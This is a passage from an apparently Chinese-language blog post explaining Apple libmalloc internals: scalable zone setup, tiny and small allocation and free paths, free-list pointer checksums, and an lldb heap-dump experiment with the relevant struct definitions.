*default_zone_malloc(malloc_zone_t *zone, size_t size){    zone = runtime_default_zone();    return zone-&gt;malloc(zone, size);}</code></pre><p>这里的<code>runtime_default_zone()</code>很重要，其实这里才是去真正的初始化zone</p><pre><code class="c">runtime_default_zone   // inline----inline_malloc_default_zone  //inline--------_malloc_initialize_once  //inline ------------_malloc_initialize()</code></pre><p>下面看<code>_malloc_initialize</code>函数，去掉了一些不相干代码</p><pre><code class="c">static void_malloc_initialize(void *context __unused){    MALLOC_LOCK();    unsigned n;    malloc_zone_t *zone = NULL;    ...    zone = create_scalable_zone(0, malloc_debug_flags);    malloc_zone_register_while_locked(zone);    malloc_set_zone_name(zone, DEFAULT_MALLOC_ZONE_STRING);        initial_default_zone = zone;    if (n != 0) { // make the default first, for efficiency        unsigned protect_size = malloc_num_zones_allocated * sizeof(malloc_zone_t *);        malloc_zone_t *hold = malloc_zones[0];        if (hold-&gt;zone_name &amp;&amp; strcmp(hold-&gt;zone_name, DEFAULT_MALLOC_ZONE_STRING) == 0) {            malloc_set_zone_name(hold, NULL);        }        mprotect(malloc_zones, protect_size, PROT_READ | PROT_WRITE);        malloc_zones[0] = malloc_zones[n];        malloc_zones[n] = hold;        mprotect(malloc_zones, protect_size, PROT_READ);    }    ...}</code></pre><p>这里主要看<code>create_scalable_zone</code>函数，所以默认的zone实际上就是scalable zone</p><pre><code class="c">malloc_zone_t *create_scalable_zone(size_t initial_size, unsigned debug_flags) {    return (malloc_zone_t *) create_scalable_szone(initial_size, debug_flags);}szone_t *create_scalable_szone(size_t initial_size, unsigned debug_flags){    szone_t *szone;    /* get memory for the zone. */    szone = mvm_allocate_pages(SZONE_PAGED_SIZE, 0, 0, VM_MEMORY_MALLOC);    if (!szone) {        return NULL;    }    ...    // Query the number of configured processors.    // Uniprocessor case gets just one tiny and one small magazine (whose index is zero). This gives    // the same behavior as the original scalable malloc. MP gets per-CPU magazines    // that scale (way) better.    unsigned int max_mags = mag_max_magazines();    uint32_t num_magazines = (max_mags &gt; 1) ? MIN(max_mags, TINY_MAX_MAGAZINES) : 1;    rack_init(&amp;szone-&gt;tiny_rack, RACK_TYPE_TINY, num_magazines, debug_flags);    rack_init(&amp;szone-&gt;small_rack, RACK_TYPE_SMALL, num_magazines, debug_flags);#if CONFIG_LARGE_CACHE    // madvise(..., MADV_REUSABLE) death-row arrivals above this threshold [~0.1%]    szone-&gt;large_entry_cache_reserve_limit = (size_t)(memsize &gt;&gt; 10);    /* &lt;rdar://problem/6610904&gt; Reset protection when returning a previous large allocation? */    int32_t libSystemVersion = NSVersionOfLinkTimeLibrary(&quot;System&quot;);    if ((-1 != libSystemVersion) &amp;&amp; ((libSystemVersion &gt;&gt; 16) &lt; 112) /* CFSystemVersionSnowLeopard */) {        szone-&gt;large_legacy_reset_mprotect = TRUE;    } else {        szone-&gt;large_legacy_reset_mprotect = FALSE;    }#endif    // Initialize the security token.    szone-&gt;cookie = (uintptr_t)malloc_entropy[0];    szone-&gt;basic_zone.version = 10;    szone-&gt;basic_zone.size = (void *)szone_size;    szone-&gt;basic_zone.malloc = (void *)szone_malloc;    szone-&gt;basic_zone.calloc = (void *)szone_calloc;    szone-&gt;basic_zone.valloc = (void *)szone_valloc;    szone-&gt;basic_zone.free = (void *)szone_free;    szone-&gt;basic_zone.realloc = (void *)szone_realloc;    szone-&gt;basic_zone.destroy = (void *)szone_destroy;    szone-&gt;basic_zone.batch_malloc = (void *)szone_batch_malloc;    szone-&gt;basic_zone.batch_free = (void *)szone_batch_free;    szone-&gt;basic_zone.introspect = (struct malloc_introspection_t *)&amp;szone_introspect;    szone-&gt;basic_zone.memalign = (void *)szone_memalign;    szone-&gt;basic_zone.free_definite_size = (void *)szone_free_definite_size;    szone-&gt;basic_zone.pressure_relief = (void *)szone_pressure_relief;    szone-&gt;basic_zone.claimed_address = (void *)szone_claimed_address;    /* Set to zero once and for all as required by CFAllocator. */    szone-&gt;basic_zone.reserved1 = 0;    /* Set to zero once and for all as required by CFAllocator. */    szone-&gt;basic_zone.reserved2 = 0;    /* Prevent overwriting the function pointers in basic_zone. */    mprotect(szone, sizeof(szone-&gt;basic_zone), PROT_READ);    szone-&gt;debug_flags = debug_flags;    _malloc_lock_init(&amp;szone-&gt;large_szone_lock);    szone-&gt;cpu_id_key = -1UL; // Unused.    CHECK(szone, __PRETTY_FUNCTION__);    return szone;}</code></pre><p>这个函数分配并且初始化了szone，设置了<code>szone_malloc</code>、<code>szone_free</code>等函数</p><p>所以后面在调用<code>malloc</code>和<code>free</code>的时候实际上调用的是<code>szone_malloc</code>、<code>szone_free</code>。<code>szone_malloc</code>的实现涉及到苹果关于堆设计中最重要的部分，这里先不展开讲解。可以看出苹果设计的这种结构很方便扩展，事实上的确如此，不仅是scalable zone，还可以注册WebKit Malloc、GFXMallocZone、QuartzCore。由对应zone的<code>malloc_zone_*</code>进行实际的内存分配工作。</p><p>下面是程序第一次调用malloc的栈帧，可以看出与我们分析的调用顺序一致</p><pre><code class="c"> *  frame #0: 0x00007fff60bd72af libsystem_malloc.dylib`create_scalable_szone    frame #1: 0x00007fff60bd6e71 libsystem_malloc.dylib`_malloc_initialize + 1482    frame #2: 0x00007fff60c0facb libsystem_platform.dylib`_os_once_callout + 18    frame #3: 0x00007fff60bd68a5 libsystem_malloc.dylib`default_zone_malloc + 77    frame #4: 0x00007fff60bd6807 libsystem_malloc.dylib`malloc_zone_malloc + 103    frame #5: 0x00007fff60bd6783 libsystem_malloc.dylib`malloc + 24    frame #6: 0x00007fff60a9831d libsystem_c.dylib`arc4_init + 109    frame #7: 0x00007fff60a98479 libsystem_c.dylib`arc4random_buf + 37    frame #8: 0x00007fff5f94644e libobjc.A.dylib`_read_images + 396    frame #9: 0x00007fff5f945473 libobjc.A.dylib`map_images_nolock + 1197    frame #10: 0x00007fff5f959279 libobjc.A.dylib`map_images + 68    ....</code></pre><h4 id="scalable-zone"><a href="#scalable-zone" class="headerlink" title="scalable zone"></a>scalable zone</h4><p>szone包含两个racks，分别是tiny和small rack</p><table><thead><tr><th>rack</th><th>32位机器</th><th>64位机器</th></tr></thead><tbody><tr><td>tiny</td><td>&lt;= 496B</td><td>&lt;= 1008B</td></tr><tr><td>small</td><td>&lt;= 128KB</td><td>&lt;=128KB</td></tr></tbody></table><p>大于127KB的就由large allocator分配，直接采用分配页大小的方式。这里不详细讨论。</p><ul><li>有几个处理器，rack就有几个magazine</li><li>每个magazine有多个regions，tiny(1MB)、small(8MB)</li><li>每个region被分为quantum，tiny(16B，64520 Q/region)、small(512B，16319 Q/region)</li></ul><p>具体可以从后面结构体中看出来其包含关系。</p><h5 id="malloc-gt-szone-malloc-gt-szone-malloc-should-clear"><a href="#malloc-gt-szone-malloc-gt-szone-malloc-should-clear" class="headerlink" title="malloc-&gt;szone_malloc-&gt;szone_malloc_should_clear"></a>malloc-&gt;szone_malloc-&gt;szone_malloc_should_clear</h5><pre><code class="c">MALLOC_NOINLINE void *szone_malloc_should_clear(szone_t *szone, size_t size, boolean_t cleared_requested){    void *ptr;    msize_t msize;    if (size &lt;= SMALL_THRESHOLD) {        // tiny size: &lt;=1008 bytes (64-bit), &lt;=496 bytes (32-bit)        // think tiny        msize = TINY_MSIZE_FOR_BYTES(size + TINY_QUANTUM - 1);        if (!msize) {            msize = 1;        }        ptr = tiny_malloc_should_clear(&amp;szone-&gt;tiny_rack, msize, cleared_requested);    } else if (size &lt;= szone-&gt;large_threshold) {        // small size: &lt;=15k (iOS), &lt;=64k (large iOS), &lt;=128k (macOS)        // think small        msize = SMALL_MSIZE_FOR_BYTES(size + SMALL_QUANTUM - 1);        if (!msize) {            msize = 1;        }        ptr = small_malloc_should_clear(&amp;szone-&gt;small_rack, msize, cleared_requested);    } else {        // large: all other allocations        size_t num_kernel_pages = round_page_quanta(size) &gt;&gt; vm_page_quanta_shift;        if (num_kernel_pages == 0) { /* Overflowed */            ptr = 0;        } else {            ptr = large_malloc(szone, num_kernel_pages, 0, cleared_requested);        }    }    return ptr;}</code></pre><p>上面可以清楚看出会根据其申请内存大小从tiny、small、large三种方式分配。这里以tiny为例</p><h5 id="tiny-malloc-should-clear"><a href="#tiny-malloc-should-clear" class="headerlink" title="tiny_malloc_should_clear"></a>tiny_malloc_should_clear</h5><pre><code class="c">void *tiny_malloc_should_clear(rack_t *rack, msize_t msize, boolean_t cleared_requested){    void *ptr;    mag_index_t mag_index = tiny_mag_get_thread_index() % rack-&gt;num_magazines;    magazine_t *tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);    MALLOC_TRACE(TRACE_tiny_malloc, (uintptr_t)rack, TINY_BYTES_FOR_MSIZE(msize), (uintptr_t)tiny_mag_ptr, cleared_requested);#if DEBUG_MALLOC    if (DEPOT_MAGAZINE_INDEX == mag_index) {        malloc_zone_error(rack-&gt;debug_flags, true, &quot;malloc called for magazine index -1\n&quot;);        return (NULL);    }    if (!msize) {        malloc_zone_error(rack-&gt;debug_flags, true, &quot;invariant broken (!msize) in allocation (region)\n&quot;);        return (NULL);    }#endif    SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);#if CONFIG_TINY_CACHE    ptr = tiny_mag_ptr-&gt;mag_last_free;    if (tiny_mag_ptr-&gt;mag_last_free_msize == msize) {        // we have a winner        tiny_mag_ptr-&gt;mag_last_free = NULL;        tiny_mag_ptr-&gt;mag_last_free_msize = 0;        tiny_mag_ptr-&gt;mag_last_free_rgn = NULL;        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);        CHECK(szone, __PRETTY_FUNCTION__);        if (cleared_requested) {            memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));        }#if DEBUG_MALLOC        if (LOG(szone, ptr)) {            malloc_report(ASL_LEVEL_INFO, &quot;in tiny_malloc_should_clear(), tiny cache ptr=%p, msize=%d\n&quot;, ptr, msize);        }#endif        return ptr;    }#endif /* CONFIG_TINY_CACHE */    while (1) {        ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);        if (ptr) {            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            CHECK(szone, __PRETTY_FUNCTION__);            if (cleared_requested) {                memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));            }            return ptr;        }        if (tiny_get_region_from_depot(rack, tiny_mag_ptr, mag_index, msize)) {            ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);            if (ptr) {                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                CHECK(szone, __PRETTY_FUNCTION__);                if (cleared_requested) {                    memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));                }                return ptr;            }        }        // The magazine is exhausted. A new region (heap) must be allocated to satisfy this call to malloc().        // The allocation, an mmap() system call, will be performed outside the magazine spin locks by the first        // thread that suffers the exhaustion. That thread sets &quot;alloc_underway&quot; and enters a critical section.        // Threads arriving here later are excluded from the critical section, yield the CPU, and then retry the        // allocation. After some time the magazine is resupplied, the original thread leaves with its allocation,        // and retry-ing threads succeed in the code just above.        if (!tiny_mag_ptr-&gt;alloc_underway) {            void *fresh_region;            // time to create a new region (do this outside the magazine lock)            tiny_mag_ptr-&gt;alloc_underway = TRUE;            OSMemoryBarrier();            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            fresh_region = mvm_allocate_pages_securely(TINY_REGION_SIZE, TINY_BLOCKS_ALIGN, VM_MEMORY_MALLOC_TINY, rack-&gt;debug_flags);            SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);            // DTrace USDT Probe            MAGMALLOC_ALLOCREGION(TINY_SZONE_FROM_RACK(rack), (int)mag_index, fresh_region, TINY_REGION_SIZE);            if (!fresh_region) { // out of memory!                tiny_mag_ptr-&gt;alloc_underway = FALSE;                OSMemoryBarrier();                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                return NULL;            }            ptr = tiny_malloc_from_region_no_lock(rack, tiny_mag_ptr, mag_index, msize, fresh_region);            // we don&#39;t clear because this freshly allocated space is pristine            tiny_mag_ptr-&gt;alloc_underway = FALSE;            OSMemoryBarrier();            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            CHECK(szone, __PRETTY_FUNCTION__);            return ptr;        } else {            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            yield();            SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);        }    }    /* NOTREACHED */}</code></pre><p>这里的<code>if (tiny_mag_ptr-&gt;mag_last_free_msize == msize)</code>是判断申请大小是否和缓存的大小相同，如果相同，则直接把该内存返回给程序。反之则从<code>ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);</code>free list中去获取刚好大于该大小的free list。这里的free list是按quantum的倍数递增的一个链表。若还是不能满足则去freelist中由合并得到的较大block中去分配。还不能满足则去region剩余部分申请。最后还不满足则申请新的一个region。申请失败则返回NULL。</p><h5 id="free-gt-malloc-zone-free-gt-szone-free"><a href="#free-gt-malloc-zone-free-gt-szone-free" class="headerlink" title="free-&gt;malloc_zone_free-&gt;szone_free"></a>free-&gt;malloc_zone_free-&gt;szone_free</h5><pre><code class="c">voidszone_free(szone_t *szone, void *ptr){    region_t tiny_region;    region_t small_region;#if DEBUG_MALLOC    if (LOG(szone, ptr)) {        malloc_report(ASL_LEVEL_INFO, &quot;in szone_free with %p\n&quot;, ptr);    }#endif    if (!ptr) {        return;    }    /*     * Try to free to a tiny region.     */    if ((uintptr_t)ptr &amp; (TINY_QUANTUM - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;Non-aligned pointer %p being freed\n&quot;, ptr);        return;    }    if ((tiny_region = tiny_region_for_ptr_no_lock(&amp;szone-&gt;tiny_rack, ptr)) != NULL) {        if (TINY_INDEX_FOR_PTR(ptr) &gt;= NUM_TINY_BLOCKS) {            malloc_zone_error(szone-&gt;debug_flags, true, &quot;Pointer %p to metadata being freed\n&quot;, ptr);            return;        }        free_tiny(&amp;szone-&gt;tiny_rack, ptr, tiny_region, 0);        return;    }    /*     * Try to free to a small region.     */    if ((uintptr_t)ptr &amp; (SMALL_QUANTUM - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;Non-aligned pointer %p being freed (2)\n&quot;, ptr);        return;    }    if ((small_region = small_region_for_ptr_no_lock(&amp;szone-&gt;small_rack, ptr)) != NULL) {        if (SMALL_META_INDEX_FOR_PTR(ptr) &gt;= NUM_SMALL_BLOCKS) {            malloc_zone_error(szone-&gt;debug_flags, true, &quot;Pointer %p to metadata being freed (2)\n&quot;, ptr);            return;        }        free_small(&amp;szone-&gt;small_rack, ptr, small_region, 0);        return;    }    /* check that it&#39;s a legal large allocation */    if ((uintptr_t)ptr &amp; (vm_page_quanta_size - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;non-page-aligned, non-allocated pointer %p being freed\n&quot;, ptr);        return;    }    free_large(szone, ptr);}</code></pre><p>同样，free的时候会先判断该内存是否属于tiny，small，large。则选取对应的free函数。这里以tiny为例</p><pre><code class="c">voidfree_tiny(rack_t *rack, void *ptr, region_t tiny_region, size_t known_size){    msize_t msize;    boolean_t is_free;    mag_index_t mag_index = MAGAZINE_INDEX_FOR_TINY_REGION(tiny_region);    magazine_t *tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);    MALLOC_TRACE(TRACE_tiny_free, (uintptr_t)rack, (uintptr_t)ptr, (uintptr_t)tiny_mag_ptr, known_size);    // ptr is known to be in tiny_region    if (known_size) {        msize = TINY_MSIZE_FOR_BYTES(known_size + TINY_QUANTUM - 1);    } else {        msize = get_tiny_meta_header(ptr, &amp;is_free);        if (is_free) {            free_tiny_botch(rack, ptr);            return;        }    }#if DEBUG_MALLOC    if (!msize) {        malloc_report(ASL_LEVEL_ERR, &quot;*** free_tiny() block in use is too large: %p\n&quot;, ptr);        return;    }#endif    SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);#if CONFIG_TINY_CACHE    // Depot does not participate in CONFIG_TINY_CACHE since it can&#39;t be directly malloc()&#39;d    if (DEPOT_MAGAZINE_INDEX != mag_index) {        if (msize &lt; TINY_QUANTUM) {                      // to see if the bits fit in the last 4 bits            void *ptr2 = tiny_mag_ptr-&gt;mag_last_free; // Might be NULL            msize_t msize2 = tiny_mag_ptr-&gt;mag_last_free_msize;            region_t rgn2 = tiny_mag_ptr-&gt;mag_last_free_rgn;            /* check that we don&#39;t already have this pointer in the cache */            if (ptr == ptr2) {                free_tiny_botch(rack, ptr);                return;            }            if ((rack-&gt;debug_flags &amp; MALLOC_DO_SCRIBBLE) &amp;&amp; msize) {                memset(ptr, SCRABBLE_BYTE, TINY_BYTES_FOR_MSIZE(msize));            }            tiny_mag_ptr-&gt;mag_last_free = ptr;            tiny_mag_ptr-&gt;mag_last_free_msize = msize;            tiny_mag_ptr-&gt;mag_last_free_rgn = tiny_region;            if (!ptr2) {                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                CHECK(szone, __PRETTY_FUNCTION__);                return;            }            msize = msize2;            ptr = ptr2;            tiny_region = rgn2;        }    }#endif /* CONFIG_TINY_CACHE */    // Now in the time it took to acquire the lock, the region may have migrated    // from one magazine to another. I.e. trailer-&gt;mag_index is volatile.    // In which case the magazine lock we obtained (namely magazines[mag_index].mag_lock)    // is stale. If so, keep on tryin&#39; ...    region_trailer_t *trailer = REGION_TRAILER_FOR_TINY_REGION(tiny_region);    mag_index_t refreshed_index;    while (mag_index != (refreshed_index = trailer-&gt;mag_index)) { // Note assignment        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);        mag_index = refreshed_index;        tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);        SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);    }    if (tiny_free_no_lock(rack, tiny_mag_ptr, mag_index, tiny_region, ptr, msize)) {        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);    }    CHECK(szone, __PRETTY_FUNCTION__);}</code></pre><p>free的时候先将该内存缓存到<code>mag_last_free</code>，若之前<code>mag_last_free</code>为NULL，那么该内存暂时不会被free，仅仅是缓存到<code>mag_last_free</code>。反之，则会将<code>mag_last_free</code>之前的内存free。在free的时候会尝试向前向后合并。合并完成后设置其前后chunk指针等metadata后将其放入对应的free list大小之中。这里需要有注意以下几点</p><ul><li>最近free的内存会被缓存，不会立即合并</li><li>在被free的块metadata是被保护的<ul><li>前后指针按16字节大小对齐</li><li>指针前4位为checksum</li></ul></li></ul><p>关于free块checksum计算如下：</p><pre><code class="c">static MALLOC_INLINE uintptr_tfree_list_checksum_ptr(rack_t *rack, void *ptr){    uintptr_t p = (uintptr_t)ptr;    return (p &gt;&gt; NYBBLE) | ((free_list_gen_checksum(p ^ rack-&gt;cookie) &amp; (uintptr_t)0xF) &lt;&lt; ANTI_NYBBLE); // compiles to rotate instruction}</code></pre><p>指针p与cookie异或然后计算checksum后左移到最高字节或上指针p右移4位得到checksumed后的指针。</p><h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>代码如下</p><pre><code class="c">#include &lt;stdio.h&gt;int main(int argc, char *argv[]) {    void *p1,*p2,*p3,*p4;    p1 = malloc(24);    p2 = malloc(24);    p3 = malloc(24);    p4 = malloc(24);    memset(p1,0xaa,24);    memset(p2,0xbb,24);    memset(p3,0xcc,24);    free(p1);    free(p3);    free(p2);    free(p4);}</code></pre><p>free(p1)，直接将p1缓存，所以内存值不变</p><pre><code class="c">(lldb) x/24gx p10x1002001f0: 0xaaaaaaaaaaaaaaaa 0xaaaaaaaaaaaaaaaa0x100200200: 0xaaaaaaaaaaaaaaaa 0x00007fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0xcccccccccccccccc 0xcccccccccccccccc0x100200240: 0xcccccccccccccccc 0x0000000000000000</code></pre><p>free(p3)，p3放入缓存，p1放入大小为32字节的freelist，p1previous指针8字节设为NULL，next指针指向设为下一个free block，紧接着后面为该block大小，2*quantum=32字节</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x0000000000000000 0x10000000100201080x100200200: 0xaaaaaaaaaaaa0002 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0xcccccccccccccccc 0xcccccccccccccccc0x100200240: 0xcccccccccccccccc 0x0000000000000000</code></pre><p>free(p2)，p2放入缓存，p3放入大小为32字节的freelist，p3previous指针8字节设为NULL，next指针指向设为下一个p1</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x3000000010020023 0x10000000100201080x100200200: 0xaaaaaaaaaaaa0002 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0x0000000000000000 0x200000001002001f0x100200240: 0xcccccccccccc0002 0x00020000000000000x100200250: 0x0000000000000000 0x00000000000000000x100200260: 0x0000000000000029 0x0000000000000000</code></pre><p>free(p4)，p2向前向后合并，合并p1，p3。指向p1，大小为6*quantum=96字节。previous指针8字节设为NULL，next指针指向设为下一个大小为3Q的block</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x0000000000000000 0x50000000100200480x100200200: 0xaaaaaaaaaaaa0006 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0x0000000000000000 0x10000000100201080x100200240: 0xcccccccccccc0002 0x00060000000000000x100200250: 0x0000000000000000 0x00000000000000000x100200260: 0x0000000000000029 0x0000000000000000</code></pre><p>上面可以看出previous和next指针前4位都包含checksum。与上面描述的一致。</p><h4 id="libmalloc中一些结构体"><a href="#libmalloc中一些结构体" class="headerlink" title="libmalloc中一些结构体"></a>libmalloc中一些结构体</h4><h5 id="szone-s-magazine-zone-h"><a href="#szone-s-magazine-zone-h" class="headerlink" title="szone_s // magazine_zone.h"></a>szone_s // magazine_zone.h</h5><pre><code class="c">typedef struct szone_s {      // vm_allocate()&#39;d, so page-aligned to begin with.    malloc_zone_t basic_zone; // first page will be given read-only protection    uint8_t pad[PAGE_MAX_SIZE - sizeof(malloc_zone_t)];    unsigned long cpu_id_key; // unused    // remainder of structure is R/W (contains no function pointers)    unsigned debug_flags;    void *log_address;    /* Allocation racks per allocator type. */    struct rack_s tiny_rack;    struct rack_s small_rack;    /* large objects: all the rest */    _malloc_lock_s large_szone_lock MALLOC_CACHE_ALIGN; // One customer at a time for large    unsigned num_large_objects_in_use;    unsigned num_large_entries;    large_entry_t *large_entries; // hashed by location; null entries don&#39;t count    size_t num_bytes_in_large_objects;#if CONFIG_LARGE_CACHE    int large_entry_cache_oldest;    int large_entry_cache_newest;    large_entry_t large_entry_cache[LARGE_ENTRY_CACHE_SIZE]; // &quot;death row&quot; for large malloc/free    boolean_t large_legacy_reset_mprotect;    size_t large_entry_cache_reserve_bytes;    size_t large_entry_cache_reserve_limit;    size_t large_entry_cache_bytes; // total size of death row, bytes#endif    /* flag and limits pertaining to altered malloc behavior for systems with     * large amounts of physical memory */    unsigned is_largemem;    unsigned large_threshold;    unsigned vm_copy_threshold;    /* security cookie */    uintptr_t cookie;    /* The purgeable zone constructed by create_purgeable_zone() would like to hand off tiny and small     * allocations to the default scalable zone. Record the latter as the &quot;helper&quot; zone here. */    struct szone_s *helper_zone;    boolean_t flotsam_enabled;} szone_t;</code></pre><h5 id="malloc-zone-t-malloc-h"><a href="#malloc-zone-t-malloc-h" class="headerlink" title="malloc_zone_t // malloc.h"></a>malloc_zone_t // malloc.h</h5><pre><code class="c">typedef struct _malloc_zone_t {    /* Only zone implementors should depend on the layout of this structure;    Regular callers should use the access functions below */    void    *reserved1;    /* RESERVED FOR CFAllocator DO NOT USE */    void    *reserved2;    /* RESERVED FOR CFAllocator DO NOT USE */    size_t     (* MALLOC_ZONE_FN_PTR(size))(struct _malloc_zone_t *zone, const void *ptr); /* returns the size of a block or 0 if not in this zone; must be fast, especially for negative answers */    void     *(* MALLOC_ZONE_FN_PTR(malloc))(struct _malloc_zone_t *zone, size_t size);    void     *(* MALLOC_ZONE_FN_PTR(calloc))(struct _malloc_zone_t *zone, size_t num_items, size_t size); /* same as malloc, but block returned is set to zero */    void     *(* MALLOC_ZONE_FN_PTR(valloc))(struct _malloc_zone_t *zone, size_t size); /* same as malloc, but block returned is set to zero and is guaranteed to be page aligned */    void     (* MALLOC_ZONE_FN_PTR(free))(struct _malloc_zone_t *zone, void *ptr);    void     *(* MALLOC_ZONE_FN_PTR(realloc))(struct _malloc_zone_t *zone, void *ptr, size_t size);    void     (* MALLOC_ZONE_FN_PTR(destroy))(struct _malloc_zone_t *zone); /* zone is destroyed and all memory reclaimed */g    const char    *zone_name;    /* Optional batch callbacks; these may be NULL */    unsigned    (* MALLOC_ZONE_FN_PTR(batch_malloc))(struct _malloc_zone_t *zone, size_t size, void **results, unsigned num_requested); /* given a size, returns pointers capable of holding that size; returns the number of pointers allocated (maybe 0 or less than num_requested) */    void    (* MALLOC_ZONE_FN_PTR(batch_free))(struct _malloc_zone_t *zone, void **to_be_freed, unsigned num_to_be_freed); /* frees all the pointers in to_be_freed; note that to_be_freed may be overwritten during the process */    struct malloc_introspection_t    * MALLOC_INTROSPECT_TBL_PTR(introspect);    unsigned    version;    /* aligned memory allocation. The callback may be NULL. Present in version &gt;= 5. */    void *(* MALLOC_ZONE_FN_PTR(memalign))(struct _malloc_zone_t *zone, size_t alignment, size_t size);    /* free a pointer known to be in zone and known to have the given size. The callback may be NULL. Present in version &gt;= 6.*/    void (* MALLOC_ZONE_FN_PTR(free_definite_size))(struct _malloc_zone_t *zone, void *ptr, size_t size);    /* Empty out caches in the face of memory pressure. The callback may be NULL. Present in version &gt;= 8. */    size_t     (* MALLOC_ZONE_FN_PTR(pressure_relief))(struct _malloc_zone_t *zone, size_t goal);    /*     * Checks whether an address might belong to the zone. May be NULL. Present in version &gt;= 10.     * False positives are allowed (e.g. the pointer was freed, or it&#39;s in zone space that has     * not yet been allocated. False negatives are not allowed.     */    boolean_t (* MALLOC_ZONE_FN_PTR(claimed_address))(struct _malloc_zone_t *zone, void *ptr);} malloc_zone_t;</code></pre><h5 id="rack-t-magazine-rack-h"><a href="#rack-t-magazine-rack-h" class="headerlink" title="rack_t // magazine_rack.h"></a>rack_t // magazine_rack.h</h5><pre><code class="c">typedef struct rack_s {    /* Regions for tiny objects */    _malloc_lock_s region_lock MALLOC_CACHE_ALIGN;    rack_type_t type;    size_t num_regions;    size_t num_regions_dealloc;    region_hash_generation_t *region_generation;    region_hash_generation_t rg[2];    region_t initial_regions[INITIAL_NUM_REGIONS];    int num_magazines;    unsigned num_magazines_mask;    int num_magazines_mask_shift;    uint32_t debug_flags;    // array of per-processor magazines    magazine_t *magazines;    uintptr_t cookie;    uintptr_t last_madvise;} rack_t;</code></pre><h5 id="magazine-t-magazine-zone-h"><a href="#magazine-t-magazine-zone-h" class="headerlink" title="magazine_t // magazine_zone.h"></a>magazine_t // magazine_zone.h</h5><pre><code class="c">typedef struct magazine_s { // vm_allocate()&#39;d, so the array of magazines is page-aligned to begin with.    // Take magazine_lock first,  Depot lock when needed for recirc, then szone-&gt;{tiny,small}_regions_lock when needed for alloc    _malloc_lock_s magazine_lock MALLOC_CACHE_ALIGN;    // Protection for the crtical section that does allocate_pages outside the magazine_lock    volatile boolean_t alloc_underway;    // One element deep &quot;death row&quot;, optimizes malloc/free/malloc for identical size.    void *mag_last_free;    msize_t mag_last_free_msize;    // msize for mag_last_free#if MALLOC_TARGET_64BIT    uint32_t _pad;#endif    region_t mag_last_free_rgn; // holds the region for mag_last_free    free_list_t mag_free_list[MAGAZINE_FREELIST_SLOTS];    uint32_t mag_bitmap[MAGAZINE_FREELIST_BITMAP_WORDS];    // the first and last free region in the last block are treated as big blocks in use that are not accounted for    size_t mag_bytes_free_at_end;    size_t mag_bytes_free_at_start;    region_t mag_last_region; // Valid iff mag_bytes_free_at_end || mag_bytes_free_at_start &gt; 0    // bean counting ...    size_t mag_num_bytes_in_objects;    size_t num_bytes_in_magazine;    unsigned mag_num_objects;    // recirculation list -- invariant: all regions owned by this magazine that meet the emptiness criteria    // are located nearer to the head of the list than any region that doesn&#39;t satisfy that criteria.    // Doubly linked list for efficient extraction.    unsigned recirculation_entries;    region_trailer_t *firstNode;    region_trailer_t *lastNode;#if MALLOC_TARGET_64BIT    uintptr_t pad[320 - 14 - MAGAZINE_FREELIST_SLOTS -            (MAGAZINE_FREELIST_BITMAP_WORDS + 1) / 2];#else    uintptr_t pad[320 - 16 - MAGAZINE_FREELIST_SLOTS -            MAGAZINE_FREELIST_BITMAP_WORDS];#endif} magazine_t;</code></pre><h5 id="tiny-region-t-magazine-zone-h"><a href="#tiny-region-t-magazine-zone-h" class="headerlink" title="tiny_region_t //magazine_zone.h"></a>tiny_region_t //magazine_zone.h</h5><pre><code class="c">/* * Layout of a tiny region */typedef uint32_t tiny_block_t[4]; // assert(TINY_QUANTUM == sizeof(tiny_block_t))typedef struct tiny_header_inuse_pair {    uint32_t header;    uint32_t inuse;} tiny_header_inuse_pair_t;typedef struct region_trailer {    struct region_trailer *prev;    struct region_trailer *next;    boolean_t recirc_suitable;    volatile int pinned_to_depot;    unsigned bytes_used;    mag_index_t mag_index;} region_trailer_t;#define NUM_TINY_BLOCKS 64520typedef struct tiny_region {    tiny_block_t blocks[NUM_TINY_BLOCKS];    region_trailer_t trailer;    // The 